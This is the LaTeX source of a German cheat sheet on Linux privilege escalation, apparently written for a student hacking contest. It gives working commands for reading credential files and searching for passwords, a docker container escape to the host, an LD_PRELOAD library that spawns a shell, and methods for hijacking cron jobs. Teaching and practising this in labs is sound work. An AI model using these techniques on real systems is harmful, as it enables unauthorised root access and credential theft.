\documentclass[
    parskip=half,
    landscape
]{scrartcl}

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{microtype}
\usepackage[sfdefault,scale=0.85]{FiraSans}
\usepackage[scale=0.85]{FiraMono}

\usepackage[
    top=15mm,
    left=15mm,
    right=15mm,
    bottom=25mm,
]{geometry}

\usepackage[ngerman]{babel}
\usepackage[babel,german=quotes]{csquotes}
\usepackage{tabularx}
\usepackage{xltabular}
\usepackage[table,xcdraw]{xcolor}
\usepackage{graphicx}
\usepackage{svg}
\usepackage{datetime}
\usepackage{multirow}
\usepackage[hidelinks]{hyperref}
\usepackage{tikz}
\usepackage{pgfplots}
\usepackage{wrapfig}
\usepackage{pgfplotstable}
\usetikzlibrary{positioning,matrix,calc,shapes.misc}
\usepackage{comment}
\usepackage[german]{varioref}
\usepackage[german]{cleveref}
\usepackage[shortlabels]{enumitem}
\usepackage{booktabs}
\usepackage{suffix}
\usepackage{multicol}
\usepackage{xparse}
\usepackage{pdflscape}
\usepackage{scrlayer-scrpage}
\clearpairofpagestyles

\providecommand{\tightlist}{%
   \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}

\ifoot{Privilege Escalation CheatSheet für HackerContest}
\ofoot{Konrad Langenberg, Jonas Franz und Simon Hilchenbach}

\RedeclareSectionCommand[
  %runin=false,
  afterindent=false,
  beforeskip=\baselineskip,
  afterskip=.1\baselineskip]{section}
\RedeclareSectionCommand[
  %runin=false,
  afterindent=false,
  beforeskip=\baselineskip,
  afterskip=.1\baselineskip]{subsection}

\let\originalhref\href
\renewcommand\href[2]{\originalhref{#1}{\color{blue}{#2}}}%

\usepackage{listings}
\lstset{ 
  basicstyle=\ttfamily,
  breakatwhitespace=false,
  breaklines=true,
  captionpos=b,
  commentstyle=\color{green!50!black},
  keepspaces=true,
  keywordstyle=\color{blue},
  numbers=none,
  numbersep=5pt,
  numberstyle=\scriptsize\ttfamily,
  showspaces=false,
  showstringspaces=false,
  showtabs=false,
  stringstyle=\color{yellow!70!black},
  frame=none,
  belowskip=-0.3\baselineskip
}
\lstset{literate=%
  {Ö}{{\"O}}1
  {Ä}{{\"A}}1
  {Ü}{{\"U}}1
  {ß}{{\ss}}1
  {ü}{{\"u}}1
  {ä}{{\"a}}1
  {ö}{{\"o}}1
}

\begin{document}
\begin{tikzpicture}[overlay,remember picture]
%    \node[anchor=north west,inner sep=5mm] at (current page.north west) {\Huge CheatSheet Privilege Escalation};
    \node[anchor=north west,inner sep=7mm] at (current page.north west) {\includesvg[width=.4\paperwidth]{img/cheatsheet_logo.svg}};

    \node[anchor=south east,inner sep=20mm,opacity=0.05] at (current page.south east) {\includesvg[width=80mm]{img/tux.svg}};
\end{tikzpicture}

\begin{multicols}{3}
\section{Informationssammlung}
\begin{itemize}
    \tightlist
    \item Benutzerinformationen
    \begin{itemize}
        \item \texttt{id}
        \item \texttt{sudo -l}
        \item \texttt{cat /etc/passwd}
        \item \texttt{cat /etc/group}
        \item \texttt{cat /etc/sudoers}
    \end{itemize}
    \item Kernel und Distribution
    \begin{itemize}
        \item \texttt{uname -a}
        \item \texttt{cat /etc/os-release}
        \item \texttt{lsb\_release -a}
    \end{itemize}
    \item Netzwerkkonfiguration
    \begin{itemize}
        \item \texttt{ifconfig} / \texttt{ip addr show}
        \item \texttt{netstat -tlpn} / \texttt{ss -antp}
        \item \texttt{iptables -L}
        \item \texttt{cat /etc/resolv.conf}
    \end{itemize}
    \item Dateien und Dienste
    \begin{itemize}
        \item \texttt{cat /etc/crontab} / \texttt{cat /etc/cron*/*}
        \item \texttt{find / -uid 0 -perm -u=s -type f 2>/dev/null}
        \item \texttt{grep -Hirn pass /*}
        \item \texttt{ls -laR /root/}
        \item \texttt{ls -laR /home/}
        \item \texttt{ps aux}
        \item \texttt{df -h}
    \end{itemize}
\end{itemize}

\section{Grundlagen}
\subsection*{Linux Berechtigungsmodell}
Alle Aktionen unter Unix-Systemen finden im Kontext eines Prozesses statt.
Ein Prozess hat einen Benutzer und mind. eine Gruppe zugewiesen, die die Berechtigungen dieses Prozesses steuern.
Die Berechtigungen werden an Kindprozesse vererbt.
Der Benutzer mit den höchsten Berechtigungen ist der \texttt{root}-Benutzer mit der ID 0.

\subsection*{User-IDs}
Unix-Benutzer und -Gruppen werden durch eine Ganzzahl identifiziert, haben in der Regel aber auch einen Namen zugewiesen.
Bei den IDs unterscheidet man mehrere Typen, wobei die beiden wichtigen die UID/GID und die EUID/EGID.
In der UID/GID sind der \enquote{echte} Benutzer und die \enquote{echte} Gruppe gespeichert, in EUID/EGID (effective) der Benutzer und die Gruppe, die zur Rechteprüfung hinzugezogen werden.

\subsection*{Zugriffsrechte}
Zugriffsrechte auf Dateien und Verzeichnisse werden nach Benutzer, Gruppe und andere aufgeschlüsselt.
Es können Lese- , Schreib- und Ausführungsberechtigungen (`rwx`) erteilt werden.
Wenn eine Datei ausgeführt wird, werden im Normalfall die IDs vom Elternprozess vererbt.
Neben diesen 9 Bits gibt es noch spezielle Bits wie das setuid-Bit (erkennbar an dem s statt x bei der `ls -l` Ausgabe)  bei Benutzer und Gruppe, welches dafür sorgt, dass bei Ausführung die EUID/EGID auf den Benutzer bzw. die Gruppe gesetzt wird.

\section{Spezielle Gruppen}
\subsection*{\texttt{video}-Gruppe}
Ein Benutzer in der \texttt{video}-Gruppe hat Zugriff auf den Bildschirm des Systems.
Die aktuell auf dem Bildschirm angezeigten Pixel können unter aus \texttt{/dev/fb0} mit dem Befehl \texttt{cat /dev/fb0 > /tmp/screen.raw} gelesen werden.
Öffnet man diese Datei dann in GIMP im Format \emph{Raw image data} (Datei $\to$ Öffnen $\to$ dann unten die Checkbox \enquote{Dateityp automatisch erkennen} abwählen und \enquote{Rohe Bilddaten} als Dateityp wählen), lässt sich nach der Dateiauswahl mit einem passenden \emph{Image type} und der richtigen Auflösung der Bildschirminhalt anzeigen.
Die Bildschirmauflösung gibt der Befehl \texttt{fbset} aus.

\subsection*{\texttt{docker}-Gruppe}
% Docker isoliert Prozesse auf Dateisystem- sowie Netzwerkebene (und weitere) unter dem selben Kernel.
% \href{https://en.wikipedia.org/wiki/Docker_(software)}{Der Wikipedia-Artikel} liefert einen guten Überblick.

Benutzer in der \texttt{docker}-Gruppe dürfen Dockercontainer starten und verwalten.

Da der Docker-Daemon mit \texttt{root}-Rechten läuft, können wir einen Container mit \texttt{root}-Rechten starten, der uns das Ausbrechen auf den Host erlaubt:

\begin{lstlisting}[language=bash]
docker run -it --privileged -v /:/root alpine chroot /root
\end{lstlisting}

Um auch die anderen Isolationen wie die Netzwerkisolation zu umgehen, brauchen wir Zugriff auf die Linux-Namespaces.
Das erreichen wir mit diesem Befehl:
\begin{lstlisting}[language=bash]
nsenter -t 1 -m -u -i -n /bin/bash
\end{lstlisting}
Dann haben wir die gleichen Privilegien wie der \texttt{init}-Prozess.

% Spalte 3
\section{Fehlkonfiguration}

\begin{itemize}
\tightlist
\item
  \texttt{login}: Benutzer ohne Passwort / mit unsicherem Passwort
\item
  \texttt{sudo}:

  \begin{itemize}
  \tightlist
  \item
    Privilegienerhöhung ohne Passwort (Option NOPASSWD)
  \item
    \texttt{env\_keep}: Reicht Umgebungsvariablen weiter, kann man in
    Kombination mit \texttt{LD\_PRELOAD} ausnutzen.
  \end{itemize}
\item
    \texttt{ssh}: Privater SSH-Key ungeschützt unter \texttt{\textasciitilde/.ssh/id\_*}
\end{itemize}

\section{Capabilities}

Capabilities teilen die Privilegien des \texttt{root}-Benutzers in verschiedene Teile auf, 
die pro Prozess einzeln aktiviert und deaktiviert werden können. 
So muss nicht jeder Prozess vollständige \texttt{root}-Rechte bekommen.
%Beispielsweise
%hat das Programm \texttt{ping} die Capability \texttt{cap\_net\_raw} um
%Rohe ICMP-Pakete verschicken zu können.
Eine Liste mit allen Capabilities ist
\href{https://man7.org/linux/man-pages/man7/capabilities.7.html}{im
Manual} zu finden.

Mit \texttt{getcap <Pfad zum Programm>} lässt
sich anzeigen, welche Capapilities ein bestimmtes Programm nutzen darf.
Mit dem \texttt{setcap}-Befehl können Capabilities gesetzt werden.
Voraussetzung ist der Besitz der \texttt{CAP\_SETFCAP}-Capability.

\section{LD\_PRELOAD}

\texttt{LD\_PRELOAD} ist eine Umgebungsvariable, die dem dynamischen
Linker angibt, welche Libraries vor Programmstart zusätzlich geladen
werden sollen. Dadurch kann man eigene Libraries injizieren, die dann
im Kontext eines anderen Programms ausgeführt werden.

Das ist dann besonders nützlich, wenn wir es in eine höhere
privilegierte Umgebung eingefügt bekommen, \hbox{z. B.} einen Service, über den unprivilegierte Benutzer Umgebungsvariablen modifizieren können.

Die dynamischen Linker führen \texttt{LD\_PRELOAD} nicht auf
suid-Binaries durch. Der musl-Linker ignoriert diese jedoch nur während
der GNU-Linker LD\_PRELOAD löscht. Dadurch kann es auf musl-Systemen
möglich sein, eigene Libraries in Kindprozesse von suid-Prozessen zu
injecten, wenn UID = EUID.

Kompilieren einer dynamischen Library; \texttt{inject.c}:
\begin{lstlisting}[language=C]
#include <stdlib.h>
#include <unistd.h>
void _init () {
  unsetenv("LD_PRELOAD");
  char *const argv[] = {"/bin/bash", NULL};
  execv(argv[0], argv);
}
\end{lstlisting}
Kompilieren der Bibliothek durch
\begin{lstlisting}[language=Bash]
  gcc -nostartfiles -shared -o inject.so inject.c
\end{lstlisting}
Injizieren der Library via
\begin{lstlisting}[language=Bash]
LD_PRELOAD=/tmp/inject.so ls
\end{lstlisting}
Es werden nicht, wie vorgesehen, die Dateien aufgelistet, sondern eine neue Shell gespawnt.

\section{Cron-Hijacking}

Cron ist ein Systemdienst, der periodisch einen Befehl ausführt. Das
linuxwiki \href{https://www.linuxwiki.de/crontab}{bietet einen guten
Überblick über die Funktionsweise}.

Es gibt verschiedene Möglichkeiten, wie man ein System mittels Cron
übernehmen kann:

\begin{itemize}
% \tightlist
\item
  \texttt{crontab}-Datei ist nicht gegen Schreibzugriffe Dritter
  abgesichert → Eigenen Befehl hinzufügen und mit Zeitplan \texttt{* * * * *} so
  bald wie möglich ausführen.
\item
  Dritte können in \texttt{/etc/cron.d} weitere crontab-Dateien anlegen;
  eine Liste von Pfaden, die Cron unter GNU/Linux durchsucht, ist
  \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Linux\%20-\%20Privilege\%20Escalation.md\#cron-jobs}{hier}
  zu finden.
\item
  Ein Shell-Skript, welches von einem Cronjob ausgeführt wird, ist nicht
  gegen Schreibzugriffe Dritter abgesichtert. Als Angreifer kann man
  dieses dann modifizieren und bis zur Ausführung am nächsten Zeitpunkt
  warten.
\end{itemize}
Eine Alternative zu Cron sind Systemd Timers.

% \section{Systemd Timers}

% Ein Systemdienst, der ähnlich wie Cron Befehle periodisch ausführt. Mit
% dem Befehl \texttt{systemctl\ list-timers\ -\/-all} lassen sich alle
% Timer anzeigen. Diese kann man dann auf ähnliche Möglichkeiten zur
% Ausnutzung untersuchen, wie bei Crontab.

\section{Kernel Exploits}

Kernel Exploits nutzen Schwachstellen im Linux-Kernel aus und sind ein besonders effektiver Angriff bei älteren Versionen.
Da der Kernelcode i.d.R. mit höheren Rechten, als der Code im Usermodus läuft, eignen sich solche Exploits gut zum Ausbauen der Rechte auf dem Zielsystem.
Eine Sammlung mit existierenden Exploits gibt es
\href{https://github.com/xairy/linux-kernel-exploitation\#exploits}{hier}.
%
Erwähnenswert ist die Kernel-Lücke DirtyCOW, welche häufig bei älteren Systemen benutzt werden kann.
Alle Infos dazu gibt es \href{https://dirtycow.ninja/}{auf der offiziellen Website}.

\section{Further Reading}

\begin{itemize}
\tightlist
\item \href{https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS}{\texttt{linpeas.sh}} -- Ein PrivEsc-Skript, welches automatisch ein System auf mögliche Schwachstellen prüft
\item
  \href{https://gtfobins.github.io/}{GTFOBins} -- Eine Liste mit
  verschiedenen Methoden, um mit Linux-Standardwerkzeugen Privilegien zu
  erhöhen
\item
  \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Linux\%20-\%20Privilege\%20Escalation.md}{PayloadsAllTheThings
  - Linux Privilege Escalation}
\item
  \href{https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist}{Linux
  Privilege Escalation Checklist}
\end{itemize}

\end{multicols}

\end{document}
